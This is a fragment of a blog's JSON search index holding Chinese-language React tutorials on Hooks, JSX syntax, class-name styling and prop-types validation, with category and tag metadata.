&#125;","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"Redux","slug":"Redux","permalink":"//www.shen.ee/tags/Redux/"},{"name":"Redux状态管理工具","slug":"Redux状态管理工具","permalink":"//www.shen.ee/tags/Redux状态管理工具/"},{"name":"状态管理工具","slug":"状态管理工具","permalink":"//www.shen.ee/tags/状态管理工具/"},{"name":"action","slug":"action","permalink":"//www.shen.ee/tags/action/"},{"name":"reducer","slug":"reducer","permalink":"//www.shen.ee/tags/reducer/"},{"name":"store","slug":"store","permalink":"//www.shen.ee/tags/store/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"深入浅出Hooks","slug":"hooks基础","date":"2022-06-15T03:38:39.000Z","updated":"2022-07-07T09:17:39.385Z","comments":true,"path":"article/25844.html","link":"","permalink":"//www.shen.ee/article/25844.html","excerpt":"","text":"Hooks-介绍 hooks 解释 Hooks：钩子、钓钩、钩住 ，Hooks 是 React v16.8 中的新增功能 hooks 作用 为函数组件提供状态、生命周期等原本 class 组件中提供的 React 功能 可以理解为通过 Hooks 为函数组件钩入 class 组件的特性 注意：Hooks 只能在函数组件中使用，自此，函数组件成为 React 的新宠儿 React v16.8 版本前后，组件开发模式的对比 React v16.8 以前： class 组件(提供状态) + 函数组件(展示内容) React v16.8 及其以后： class 组件(提供状态) + 函数组件(展示内容) Hooks(提供状态) + 函数组件(展示内容) 混用以上两种方式：部分功能用 class 组件，部分功能用 Hooks+函数组件 总结： 虽然有了 Hooks，但 React 官方并没有计划从 React 库中移除 class 有了 Hooks 以后，不能再把函数组件称为无状态组件了，因为 Hooks 为函数组件提供了状态 Hooks-解决的问题 组件的状态逻辑复用问题 在 Hooks 之前，组件的状态逻辑复用经历了：mixins（混入）、HOCs（高阶组件）、render-props 等模式 （早已废弃）mixins 的问题：1 数据来源不清晰 2 命名冲突 HOCs、render-props 的问题：重构组件结构，导致组件形成 JSX 嵌套地狱问题 class 组件自身的问题 选择：函数组件和 class 组件之间的区别以及使用哪种组件更合适 需要理解 class 中的 this 是如何工作的 相互关联且需要对照修改的代码被拆分到不同生命周期函数中 相比于函数组件来说，不利于代码压缩和优化，也不利于 TS 的类型推导 Hooks-渐进策略 什么是渐进式策略（项目开发场景）文档 不推荐直接使用 Hooks 大规模重构现有组件 推荐：新功能用 Hooks，复杂功能实现不了的，也可以继续用 class 找一个功能简单、非核心功能的组件开始使用 hooks 在 hooks 中开发会使用那些知识？ class 组件相关的 API 在 hooks 中不可用 class 自身语法，比如，constructor、static 等 钩子函数，componentDidMount、componentDidUpdate、componentWillUnmount this 相关的用法 原来学习的 React 内容还是要用的 JSX：{}、onClick={handleClick}、条件渲染、列表渲染、样式处理等 组件：函数组件、组件通讯 React 开发理念：单向数据流、状态提升 等 解决问题的思路、技巧、常见错误的分析等 总结： react 没有计划从 React 中移除 class react 将继续为 class 组件提供支持 可以在项目中同时使用 hooks 和 class useState-基本使用useState 作用 为函数组件提供状态 它是一个 hook，就是一个特殊的函数，让你在函数组件中获取状态等 React 特性。 名称上看 hook 都以use开头useXxx useState 语法1234567// 参数：状态初始值(数值、字符串、数组，对象)// 返回值：stateArray 是一个数组const stateArray = useState(0);// 索引 0 表示：状态值（state）const state = stateArray[0];// 索引 1 表示：修改状态的函数（setState）const setState = stateArray[1]; useState 使用步骤 导入 useState hook 调用 useState 函数，并传入状态的初始值 从 useState 函数的返回值中，拿到状态和修改状态的函数 在 JSX 中展示状态 在按钮的点击事件中调用修改状态的函数，来更新状态 1234567891011121314151617import &#123; useState &#125; from 'react';const Count = () =&gt; &#123; // stateArray 是一个数组 const stateArray = useState(0); const state = stateArray[0]; const setState = stateArray[1]; return ( &lt;div&gt; &#123;/* 展示状态值 */&#125; &lt;h1&gt;状态为：&#123;state&#125;&lt;/h1&gt; &#123;/* 点击按钮，让状态值 +1 */&#125; &lt;button onClick=&#123;() =&gt; setState(state + 1)&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; );&#125;; useState 写法正确姿势 数据函数需要符合业务语义，修改状态的函数名称以 set 开头，后面跟上状态的名称。 12345678910111213import &#123; useState &#125; from 'react';const Count = () =&gt; &#123; // 解构： const [count, setCount] = useState(0); return ( &lt;div&gt; &lt;h1&gt;计数器：&#123;state&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; setState(state + 1)&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; );&#125;; 总结： 给useState提供初始化值，返回数组。 数组[0] 状态数据 数组[1] 修改状态函数 参考写法：const [count, setCount] = useState(0) useState-读取和修改状态读取状态 读取状态：useState 提供的状态，是函数内部的局部变量，可以在函数内的任意位置使 123456789const UserCom = () =&gt; &#123; const [user, setUser] = useState(&#123; name: 'jack', age: 18 &#125;); return ( &lt;div&gt; &lt;p&gt;姓名：&#123;user.name&#125;&lt;/p&gt; &lt;p&gt;年龄：&#123;user.age&#125;&lt;/p&gt; &lt;/div&gt; );&#125;; 修改状态 setCount(newValue) 是一个函数，参数表示：新的状态值 调用该函数后，将使用新的状态值替换旧值 修改状态后，因为状态发生了改变，所以该组件会重新渲染 12345678910111213141516const UserCom = () =&gt; &#123; const [user, setUser] = useState(&#123; name: 'jack', age: 18 &#125;); const onAgeAdd = () =&gt; &#123; setUser(&#123; ...user, age: user.age + 1, &#125;); &#125;; return ( &lt;div&gt; &lt;p&gt;姓名：&#123;user.name&#125;&lt;/p&gt; &lt;p&gt;年龄：&#123;user.age&#125;&lt;/p&gt; &lt;button onClick=&#123;onAgeAdd&#125;&gt;年龄+1&lt;/button&gt; &lt;/div&gt; );&#125;; 总结： 修改状态的时候，一定要使用新的状态替换旧的状态 useState-组件更新过程组件初始化时候的事情 从头开始执行该组件中的代码逻辑 调用 useState(0) 将传入的参数作为状态初始值，即：0 渲染组件，此时，获取到的状态 count 值为： 0 setState 后发生的事情 点击按钮，调用 setCount(count + 1) 修改状态，因为状态发生改变，所以，该组件会重新渲染 组件重新渲染时，会再次执行该组件中的代码逻辑 再次调用 useState(0)，此时 React 内部会拿到最新的状态值而非初始值，比如，该案例中最新的状态值为 1 再次渲染组件，此时，获取到的状态 count 值为：1 12345678910import &#123; useState &#125; from 'react';const Counter = () =&gt; &#123; const [count, setCount] = useState(0); return ( &lt;div&gt; &lt;h1&gt;计数器：&#123;count&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; );&#125;; 总结： useState 的初始值(参数)只会在组件第一次渲染时生效，以后的每次渲染，useState 获取到都是最新的状态值。 useState-使用原则定义多个状态的原则 调用 useState Hook 多次即可，每调用一次 useState Hook 可以提供一个状态 useState Hook 多次调用返回的 [state, setState]，相互之间，互不影响 尽量按照业务来定义数据，不要全部定义在一起，因为是替换，不是合并 hook 函数书写位置原则 React Hooks 只能直接出现在 函数组件 中 React Hooks 不能嵌套在 if/for/其他函数 中 原理：React 是按照 Hooks 的调用顺序来识别每一个 Hook，如果每次调用的顺序不同，导致 React 无法知道是哪一个 Hook 可以通过开发者工具进行查看组件的 hooks 总结： 只能在函数组件中使用，不能嵌套在 分支循环语句 中，react 存储 hooks 状态按顺序存储。 useEffect-副作用 side effect 副作用专业解释 在计算机科学中，如果一个函数或其他操作修改了其局部环境之外的状态变量值，那么它就被称为有副作用 在函数组件中：职责就是根据状态渲染 UI，其他的事情都是副作用 通过生活例子，理解副作用 999 感冒灵，主作用：用于感冒引起的头痛，发热，鼻塞，流涕，咽痛等 副作用：可见困倦、嗜睡、口渴、虚弱感 使用函数组件常见的副作用 对于 React 组件来说，主作用就是根据数据（state/props）渲染 UI，除此之外都是副作用（比如，手动修改 DOM） 常见的副作用（side effect）：数据（Ajax）请求、手动修改 DOM、localStorage、console.log 操作等 当你想要在函数组件中，处理副作用（side effect）时，就要使用 useEffect Hook 了 总结： 对于 react 组件来说，除了渲染 UI 之外的其他操作，都可以称之为副作用 useEffect-基本使用语法介绍 参数：回调函数（称为 effect），就是在该函数中写副作用代码 执行时机：该 effect 会在组件第一次渲染以及每次组件更新后执行 相当于 componentDidMount + componentDidUpdate 123useEffect(() =&gt; &#123; // 书写副作用代码&#125;); 例：count 更新的时候显示到标题 12345678910111213141516import &#123; useEffect &#125; from 'react';const Counter = () =&gt; &#123; const [count, setCount] = useState(0); useEffect(() =&gt; &#123; document.title = `当前已点击 $&#123;count&#125; 次`; &#125;); return ( &lt;div&gt; &lt;h1&gt;计数器：&#123;count&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; );&#125;; 总结： 在函数组件处理副作用 useEffect(()=&gt;{}) 组件初始化，更新的时候执行 useEffect-依赖项默认使用 useEffect 的问题 useEffect(()=&gt;{}) 只要状态发生更新 useEffect 的 effect 回调就会执行 如果组件中有另外一个状态，另一个状态更新时，刚刚的 effect 回调也会执行 useEffect 依赖项的使用 跳过不必要的执行，只在 count 变化时，才执行相应的 effect useEffect(()=&gt;{},[依赖项]) 依赖项的值变化才会执行 effect 123456789101112131415161718import &#123; useEffect &#125; from 'react';const Counter = () =&gt; &#123; const [count, setCount] = useState(0); const [loading, setLoading] = useState(false); useEffect(() =&gt; &#123; document.title = `当前已点击 $&#123;count&#125; 次`; &#125;, [count]); return ( &lt;div&gt; &lt;h1&gt;计数器：&#123;count&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/button&gt; &lt;button onClick=&#123;() =&gt; setCount(!loading)&#125;&gt;切换 loading&lt;/button&gt; &lt;/div&gt; );&#125;; 总结： useEffect(()=&gt;{},[依赖项]) 依赖项可以指定某些状态变化再去执行副作用 useEffect-不要对依赖项撒谎 useEffect 完全指南：https://overreacted.io/zh-hans/a-complete-guide-to-useeffect/ useEffect 回调函数（effect）中用到的数据（比如，count）就是依赖数据，就应该出现在依赖项数组中 如果 useEffect 回调函数中用到了某个数据，但是，没有出现在依赖项数组中，就会导致一些 Bug 出现 所以，不要对 useEffect 的依赖撒谎 123456789101112131415const App = () =&gt; &#123; const [count, setCount] = useState(0); // 错误演示： useEffect(() =&gt; &#123; document.title = '点击了' + count + '次'; &#125;, []); return ( &lt;div&gt; &lt;h1&gt;计数器：&#123;count&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/button&gt; &lt;/div&gt; );&#125;; 总结： 副作用中使用的状态，需要写在依赖项中 useEffect-依赖是一个空数组 useEffect 的第二个参数，还可以是一个空数组（[]） 表示只在组件第一次渲染后执行 effect 该 effect 只会在组件第一次渲染后执行，因此可以执行像事件绑定等只需要执行一次的操作。 相当于 class 组件的 componentDidMount 钩子函数的作用 1234useEffect(() =&gt; &#123; const handleResize = () =&gt; &#123;&#125;; window.addEventListener('resize', handleResize);&#125;, []); 注意： 跟 useState Hook 一样，一个组件中也可以调用 useEffect Hook 多次 推荐：一个 useEffect 只处理一个功能，有多个功能时，使用多次 useEffect useEffect-清除副作用 effect 的返回值是可选的，可省略。也可以返回一个清理函数，用来执行事件解绑等清理操作 清理函数的执行时机： 清理函数会在组件卸载时以及下一次副作用回调函数调用的时候执行，用于清除上一次的副作用。 如果依赖项为空数组，那么会在组件卸载时会执行。相当于组件的componetWillUnmount 123456789useEffect(() =&gt; &#123; const handleResize = () =&gt; &#123;&#125;; window.addEventListener('resize', handleResize); // 这个返回的函数，会在该组件卸载时来执行 // 因此，可以去执行一些清理操作，比如，解绑 window 的事件、清理定时器 等 return () =&gt; window.removeEventListener('resize', handleResize);&#125;, []); useEffect-使用总结1234567891011121314151617181920212223242526272829// 1// 触发时机：1 第一次渲染会执行 2 每次组件重新渲染都会再次执行// componentDidMount + ComponentDidUpdateuseEffect(() =&gt; &#123;&#125;);// 2（使用频率最高）// 触发时机：只在组件第一次渲染时执行// componentDidMountuseEffect(() =&gt; &#123;&#125;, []);// 3（使用频率最高）// 触发时机：1 第一次渲染会执行 2 当 count 变化时会再次执行// componentDidMount + componentDidUpdate（判断 count 有没有改变）useEffect(() =&gt; &#123;&#125;, [count]);// 4useEffect(() =&gt; &#123; // 返回值函数的执行时机：组件卸载时 // 在返回的函数中，清理工作 return () =&gt; &#123; // 相当于 componentWillUnmount &#125;;&#125;, []);useEffect(() =&gt; &#123; // 返回值函数的执行时机：1 组件卸载时 2 count 变化时 // 在返回的函数中，清理工作 return () =&gt; &#123;&#125;;&#125;, [count]); Hooks进阶自定义hook 函数需要是 use 开头，否则react不认为是 hooks 自定义 hook 就是对状态和逻辑的封装，将来可以复用 例： 在App.js组件实现一个记录鼠标移动坐标的功能 把实现功能的逻辑和状态封装在一个函数中 将函数放在一个单独的js文件中，导入给App.js使用 未封装前 App.js 12345678910111213141516171819import &#123; useState, useEffect &#125; from \"react\"const App = () =&gt; &#123; const [mouse, setMouse] = useState(&#123; x: 0, y: 0 &#125;) useEffect(() =&gt; &#123; const handelMouseMove = (e) =&gt; &#123; setMouse(&#123; x: e.pageX, y: e.pageY &#125;) &#125; document.addEventListener('mousemove', handelMouseMove) return () =&gt; &#123; document.removeEventListener('mousemove', handelMouseMove) &#125; &#125;, []) return &lt;div className=\"app\"&gt;根组件 &#123;JSON.stringify(mouse)&#125;&lt;/div&gt;&#125;export default App 封装hooks之后 hook.js 123456789101112131415import &#123; useState, useEffect &#125; from \"react\"export const useMouse = () =&gt; &#123; const [mouse, setMouse] = useState(&#123; x: 0, y: 0 &#125;) useEffect(() =&gt; &#123; const handelMouseMove = (e) =&gt; &#123; setMouse(&#123; x: e.pageX, y: e.pageY &#125;) &#125; document.addEventListener('mousemove', handelMouseMove) return () =&gt; &#123; document.removeEventListener('mousemove', handelMouseMove) &#125; &#125;, []) return mouse&#125; App.js 12345678910import &#123; useMouse &#125; from \"./hooks\" const App = () =&gt; &#123; const mouse = useMouse() return &lt;div className=\"app\"&gt;根组件 &#123;JSON.stringify(mouse)&#125;&lt;/div&gt;&#125;export default App useRef-基本使用 使用useRef可以获取dom元素，组件也可以通过它获取。 导入 useRef 函数从 react 中 创建ref对象 const ref = useRef(null) 给需要获取的标签上 ref={ref} 绑定ref对象 渲染完毕后，可以通过 ref.current 获取dom元素 例：组件初始化自动获取焦点功能 123456789101112131415161718192021import &#123; useRef, useEffect &#125; from \"react\";const App = () =&gt; &#123; const inputRef = useRef(null); useEffect(() =&gt; &#123; // input DOM元素 console.log(inputRef.current); // input 获取焦点 inputRef.current.focus() &#125;, []); return ( &lt;div className=\"app\"&gt; 根组件： &lt;input type=\"text\" ref=&#123;inputRef&#125; /&gt; &lt;/div&gt; );&#125;;export default App; useContext-基本使用大致步骤： 通过 createContext 创建context对象 通过 Provider 组件包裹根组件，注入数据 在 后代 组件中使用 useContext 使用数据 通过 createContext 创建context对象 context.js 12import &#123; createContext &#125; from \"react\";export default createContext(&#123;&#125;) 通过 Provider 组件包裹根组件，注入数据 App.jsx 1234567891011121314151617import &#123; useState &#125; from \"react\";import Context from \"./context\";import Child from './Child'const App = () =&gt; &#123; const [count, setCount] = useState(0) return ( &lt;Context.Provider value=&#123;count&#125;&gt; &lt;div className=\"app\"&gt; 根组件：&#123;count&#125; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;打豆豆&lt;/button&gt; &lt;hr /&gt; &lt;Child /&gt; &lt;/div&gt; &lt;/Context.Provider&gt; );&#125;;export default App; 在 后代 组件中使用 useContext 使用数据 Child.jsx 12345678import &#123; useContext &#125; from \"react\"import Context from './context'const Child = () =&gt; &#123; const count = useContext(Context) return &lt;div&gt;后代组件：&#123;count&#125;&lt;/div&gt;&#125;export default Child 总结： 创建context对象和Provider注入数据和之前一样，使用数据只需要 useContext 即可。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"hooks","slug":"hooks","permalink":"//www.shen.ee/tags/hooks/"},{"name":"reacthooks","slug":"reacthooks","permalink":"//www.shen.ee/tags/reacthooks/"},{"name":"useState","slug":"useState","permalink":"//www.shen.ee/tags/useState/"},{"name":"useEffect","slug":"useEffect","permalink":"//www.shen.ee/tags/useEffect/"},{"name":"useRef","slug":"useRef","permalink":"//www.shen.ee/tags/useRef/"},{"name":"useContext","slug":"useContext","permalink":"//www.shen.ee/tags/useContext/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"JSX语法学习","slug":"JSX语法学习","date":"2022-06-15T02:38:39.000Z","updated":"2022-06-22T06:24:25.995Z","comments":true,"path":"article/34118.html","link":"","permalink":"//www.shen.ee/article/34118.html","excerpt":"","text":"JSX 基本概念 JSX 是 JavaScript XML 的简写，表示了在 JavaScript 中书写 XML 格式的代码。它是 React 的核心内容，它可以让我们在 React 中创建元素更加简单，更加直观，提高开发效率。 什么是JSX？ JS 扩展语法，可以在 JS 中书写 XML 语法 JSX的优点？ 可以更加 简洁、直观、高效 的声明 UI 界面 演示我们可以在 babel 的网站，在线测试 babeljs ，这个网站可以把 JSX 代码转换成 JS 代码 注意：JSX 是 JavaScript 的语法扩展，它无法在浏览器中直接使用，在 create-react-app 脚手架中内置了 @babel/plugin-transform-react-jsx 插件来解析它，成为 JavaScript 的标准语法。 JSX 基本使用 导入 react-dom 使用 JSX 创建元素 使用 react-dom 渲染 1234567891011121314import ReactDom from 'react-dom';const element = ( &lt;div id=\"box\"&gt; &lt;h1&gt;JSX&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;tom&lt;/li&gt; &lt;li&gt;jack&lt;/li&gt; &lt;li&gt;tony&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;);ReactDom.render(element, document.getElementById('root')); 上述代码运行成功，现在 React17x 可以不必导入React包，因为在 babel 转换的时候自动导入了创建 React 元素的依赖。但是如果你使用 React16x 那么你还需要手动导入 React ，如何验证？安装下低版本的 React 包即可。 总结 导入 react-dom 使用 JSX 创建元素 使用 react-dom 渲染元素 17x 版本的 React 不需要导入，如果将来遇见 低版本 是需要导入的。 补充 vscode settings.json 加上 在 react 中使用 ement 语法提示创建标签 123\"emmet.includeLanguages\": &#123; \"javascript\": \"javascriptreact\"&#125; JSX 的注意事项使用细节 特殊属性写法 className htmlFor 没有内容的节点可以使用 单标签 必需有根节点，可以使用 &lt;&gt;&lt;/&gt; 幽灵标签，其实是 &lt;React.Fragment&gt;&lt;/React.Fragment&gt; 简写 如果 JSX 有换行，最好使用 () 包裹 代码示例 特殊属性 12345// class ---&gt; className for ---&gt; htmlFor 特殊属性&lt;div className=\"box\"&gt; &lt;label htmlFor=\"ck\"&gt;&lt;/label&gt; &lt;input id=\"ck\" type=\"checkbox\" /&gt;&lt;/div&gt; 可单标签 12// &lt;span className=\"icon-edit\"&gt;&lt;/span&gt; 没内容可以写成单标签形势&lt;span className=\"icon-edit\" /&gt; 有根节点 12345678910// 1. 使用 React.Fragment 代码片段import React from 'react';import ReactDom from 'react-dom';const element = ( &lt;React.Fragment&gt; &lt;div&gt;header&lt;/div&gt; &lt;div&gt;footer&lt;/div&gt; &lt;/React.Fragment&gt;);ReactDom.render(element, document.getElementById('root')); 123456789// 2. 使用&lt;&gt;&lt;/&gt;可以避免没必要的标签产生 简写 React.Fragmentimport ReactDom from 'react-dom';const element = ( &lt;&gt; &lt;div&gt;header&lt;/div&gt; &lt;div&gt;footer&lt;/div&gt; &lt;/&gt;);ReactDom.render(element, document.getElementById('root')); 用小括号 1234567// 有换行的时候最好使用()可以让标签对其，避免没必要的错误const element = ( &lt;&gt; &lt;div&gt;header&lt;/div&gt; &lt;div&gt;footer&lt;/div&gt; &lt;/&gt;); JSX 嵌入表达式在JSX中使用{ }嵌入JS表达式，注意不能使用语句。 展示数据 进行运算 三元运算 使用函数 使用 JSX 使用注释 123456789101112131415161718192021222324252627282930313233343536373839import React from 'react';import ReactDom from 'react-dom';// 数据const data = &#123; name: 'tom', age: 18,&#125;;// 函数const up = () =&gt; &#123; return data.name.toUpperCase();&#125;;// jsx表达式const list = ( &lt;ul&gt; &lt;li&gt;jack&lt;/li&gt; &lt;li&gt;tony&lt;/li&gt; &lt;/ul&gt;);const element = ( &lt;div&gt; &#123;/* 1. 使用数据 注释推荐快键键(ctrl+/) */&#125; &lt;div&gt;姓名：&#123;data.name&#125;&lt;/div&gt; &lt;div&gt;年龄：&#123;data.age&#125;&lt;/div&gt; &#123;/* 2. 使用运算 */&#125; &lt;div&gt;明年几岁：&#123;data.age + 1&#125;&lt;/div&gt; &#123;/* 3. 使用三元 */&#125; &lt;div&gt;是否成年：&#123;data.age &gt; 16 ? '是' : '否'&#125;&lt;/div&gt; &#123;/* 4. 使用函数 */&#125; &lt;div&gt;姓名大写：&#123;up()&#125;&lt;/div&gt; &#123;/* 5. 使用JSX(jsx也是表达式) */&#125; &lt;div&gt;朋友：&#123;list&#125;&lt;/div&gt; &lt;/div&gt;);ReactDom.render(element, document.getElementById('root')); JSX 条件渲染 使用分支语句 if/else 完成条件渲染 使用 三元运算符 完成条件渲染 使用 逻辑运算符 完成条件渲染 if/else 条件渲染123456789101112const loading = true;// 不能在JSX中写语句，但，可以充分利用JS能力const getContent = () =&gt; &#123; if (loading) &#123; return &lt;div&gt;正在加载...&lt;/div&gt;; &#125; else &#123; return &lt;div&gt;数据加载完毕，这是显示数据&lt;/div&gt;; &#125;&#125;;const element = &lt;div&gt;&#123;getContent()&#125;&lt;/div&gt;; 三元运算符 完成条件渲染1234567const loading = true; const element = ( &lt;div&gt; &#123;loading ? &lt;div&gt;正在加载...&lt;/div&gt; : &lt;div&gt;数据加载完毕，这是显示数据&lt;/div&gt;&#125; &lt;/div&gt;); 逻辑运算 完成条件渲染12345678const loading = true;const element = ( &lt;div&gt; &#123;loading &amp;&amp; &lt;div&gt;正在加载...&lt;/div&gt;&#125; &#123;loading || &lt;div&gt;数据加载完毕，这是显示数据&lt;/div&gt;&#125; &lt;/div&gt;); JSX 列表渲染 可以渲染 JSX 数组 使用 map 渲染列表 直接在 JSX 中使用 map 渲染列表 key 属性使用 可以渲染 JSX 数组1234// 1. const list = ['tom', 'jack', 'tony'] 把数组转换成如下JSX数组const list = [&lt;li&gt;tom&lt;/li&gt;, &lt;li&gt;jack&lt;/li&gt;, &lt;li&gt;tony&lt;/li&gt;];// 2. 把JSX嵌入在UL标签中const elemet = &lt;ul&gt;&#123;list&#125;&lt;/ul&gt;; 使用 map 渲染列表123456// 1. 数据const list = ['tom', 'jack', 'tony'];// 2. 转jsx数组const list2 = list.map((item) =&gt; &lt;li&gt;&#123;item&#125;&lt;/li&gt;);// 3. 使用const element = &lt;ul&gt;&#123;list2&#125;&lt;/ul&gt;; 直接在 JSX 中使用 map 渲染列表12345678910// 1. 数据const list = ['tom', 'jack', 'tony'];// 2. 使用 map调用其实也是js表达式const element = ( &lt;ul&gt; &#123;list.map((item) =&gt; ( &lt;li&gt;&#123;item&#125;&lt;/li&gt; ))&#125; &lt;/ul&gt;); key 属性使用1234567891011// Warning: Each child in a list should have a unique \"key\" prop.// 1. 数据const list = ['tom', 'jack', 'tony'];// 2. 使用const element = ( &lt;ul&gt; &#123;list.map((item) =&gt; ( &lt;li key=&#123;item&#125;&gt;&#123;item&#125;&lt;/li&gt; ))&#125; &lt;/ul&gt;); JSX 样式 - style 方式 style 接受一个采用小驼峰命名属性的 JavaScript 对象，而不是 CSS 字符串 style 中的 key 采用小驼峰命名是为了与 JS 访问 DOM 节点的属性保持一致 React 会自动添加 ”px” 后缀到内联样式为数字的属性后，其他单位需要手动添加 演示代码 需求：去掉上一个列表案例 ul 的点，加上背景样式，设置字体大小，给第一个 p 设置两倍字体大小 12345678910111213141516171819202122232425262728293031import ReactDom from 'react-dom'// 1. 数据const list = [ &#123; id: 100, name: 'tom', age: 15 &#125;, &#123; id: 101, name: 'jack', age: 18 &#125;, &#123; id: 102, name: 'tony', age: 20 &#125;]+// 2. 样式+const styleObject = &#123;+ listStyle: 'none',+ backgroundColor: 'pink',+ fontSize: 20+&#125;// 3. 使用const element = (+ &lt;ul style=&#123;styleObject&#125; &gt; &#123;list.map(item =&gt; &#123; return ( &lt;li key=&#123;item.id&#125;&gt;+ &lt;p style=&#123;&#123;fontSize: '2em'&#125;&#125;&gt;姓名：&#123;item.name&#125;&lt;/p&gt; &lt;p&gt;是否成年：&#123;item.age &gt; 16 ? '是' : '否'&#125;&lt;/p&gt; &lt;/li&gt; ) &#125;)&#125; &lt;/ul&gt;)ReactDom.render(element, document.getElementById('root')) JSX 样式 - className 方式 在多数情况下，应使用 className 属性来引用外部 CSS 样式表中定义的 class className 设置类名，和 class 属性要求一样只能是字符串 如果需要根据数据设置类名，可以使用 { } 嵌入 JS 表达式实现 演示代码： 需求：在元素 button上根据 isActive 数据的值添加 active 类名 index.css 代码 123456789101112131415161718192021222324.button &#123; width: 100px; height: 40px; border: 1px solid #eee; color: #999; border-radius: 4px; display: inline-block; text-align: center; line-height: 40px; box-shadow: 2px 2px 10px #ccc; cursor: pointer; user-select: none;&#125;.button.active &#123; background: #069; color: #fff; border-color: #069;&#125;.button.block &#123; display: block; width: 100%;&#125; index.js 代码 1234567891011import ReactDom from 'react-dom';// 在src下新建index.css文件，导入进来即可import './index.css';const isActive = false;const element = ( &lt;span className=&#123;`button $&#123;isActive ? 'active' : ''&#125;`&#125;&gt;按钮&lt;/span&gt;);ReactDom.render(element, document.getElementById('root')); JSX 样式 - 动态 className 在使用 className 的时候遇见多个类名动态绑定，可以模仿 vue 使用对象的方式 vue 中绑定类名的时候使用 {类名:布尔} 用布尔值决定是否加上这个类名 例如：在元素 button上根据 isActive 数据的值添加 active 类名，isBlock 数据的值添加 block 类名 12345678910111213141516171819202122import ReactDom from 'react-dom';import './index.css';// 数据const isActive = false;const isBlock = false;// 类名对象const classObject = &#123; button: true, active: isActive, block: isBlock,&#125;;// 转换成字符串const className = Object.keys(classObject) .filter((key) =&gt; classObject[key]) .join(' ');const element = &lt;span className=&#123;className&#125;&gt;按钮&lt;/span&gt;;ReactDom.render(element, document.getElementById('root')); JSX 样式 - classnames 库使用 JS 原生的能力处理多个类名的动态绑定，当然这样的需求已经有 classnames 库给我们解决了。 安装导入 classnames1234# 安装npm i classnames# 或者 yarn add classnames 12// 导入import classNames from 'classnames' 认识 classnames API12345678// 1. 使用字符串classNames('foo', 'bar'); // foo bar// 2. 使用对象classNames(&#123; foo: true, bar: true &#125;); // foo bar// 3. 使用数组classNames(['foo', 'bar']); // foo bar// 4. 混合使用classNames('foo', &#123; bar: true &#125;); // foo bar 例如还是上面那个需求：在元素 button上根据 isActive 数据的值添加 active 类名，isBlock 数据的值添加 block 类名 123456789101112131415161718import ReactDom from 'react-dom';// 1. 导入classnamesimport classNames from 'classnames';import './index.css';// 2. 数据const isActive = true;const isBlock = true;// 3. 产生类名const className = classNames('button', &#123; active: isActive, block: isBlock,&#125;);const element = &lt;span className=&#123;className&#125;&gt;按钮&lt;/span&gt;;ReactDom.render(element, document.getElementById('root'));","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"React","slug":"React","permalink":"//www.shen.ee/tags/React/"},{"name":"JSX","slug":"JSX","permalink":"//www.shen.ee/tags/JSX/"},{"name":"JSX语法","slug":"JSX语法","permalink":"//www.shen.ee/tags/JSX语法/"},{"name":"XML","slug":"XML","permalink":"//www.shen.ee/tags/XML/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"React组件进阶及生命周期","slug":"React组件进阶","date":"2022-06-15T02:38:39.000Z","updated":"2022-06-22T06:24:25.999Z","comments":true,"path":"article/15749.html","link":"","permalink":"//www.shen.ee/article/15749.html","excerpt":"","text":"props - 类型校验 理解props都是外来的，在使用的时候如果数据类型不对，很容易造成组件内部逻辑出错 1234567891011// 开发者A创建的组件const List = props =&gt; &#123; const arr = props.colors const list = arr.map((item, index) =&gt; &lt;li key=&#123;index&#125;&gt;&#123;item.name&#125;&lt;/li&gt;) return ( &lt;ul&gt;&#123;list&#125;&lt;/ul&gt; )&#125;// 开发者B去使用组件&lt;List colors=&#123;19&#125; /&gt; 报错：TypeError: arr.map is not a function 通过 prop-types 可以在创建组件的时候进行类型检查，更合理的使用组件避免错误 安装 yarn add prop-types 导入 import PropTypes from &#39;prop-types&#39; 使用 组件名.propTypes = { &#39;props属性&#39;:&#39;props校验规则&#39; } 进行类型约定，PropTypes 包含各种规则 123456789101112import PropTypes from 'prop-types'const List = props =&gt; &#123; const arr = props.colors const lis = arr.map((item, index) =&gt; &lt;li key=&#123;index&#125;&gt;&#123;item.name&#125;&lt;/li&gt;) return &lt;ul&gt;&#123;lis&#125;&lt;/ul&gt;&#125;List.propTypes = &#123; // props属性：校验规则 colors: PropTypes.array&#125; Props - 类型校验常见类型常见的校验规则 常见类型：array、bool、func、number、object、string React元素类型：element 必填项：isRequired 特定结构的对象：shape({}) 校验规则的使用1234567891011121314const Demo = (props) =&gt; &#123; return &lt;div&gt;Demo组件&lt;/div&gt;&#125;Demo.propTypes = &#123; // 常见类型 optionalFunc: PropTypes.func, // 常见类型+必填 requiredFunc: PropTypes.func.isRequired, // 特定结构的对象 optionalObjectWithShape: PropTypes.shape(&#123; color: PropTypes.string, fontSize: PropTypes.number &#125;)&#125; props - 默认值 作用：给组件的props设置默认值，在未传入props的时候生效 设置props的默认值12345678910// 分页组件const Pagination = (props) =&gt; &#123; return &lt;div&gt; pageSize的默认值：&#123;props.pageSize&#125;&lt;/div&gt;&#125;// 设置默认值Pagination.defaultProps = &#123; pageSize: 10&#125;// 使用组件&lt;Pagination /&gt; 新版react推荐使用参数默认值来实现123456// 分页组件const Pagination = 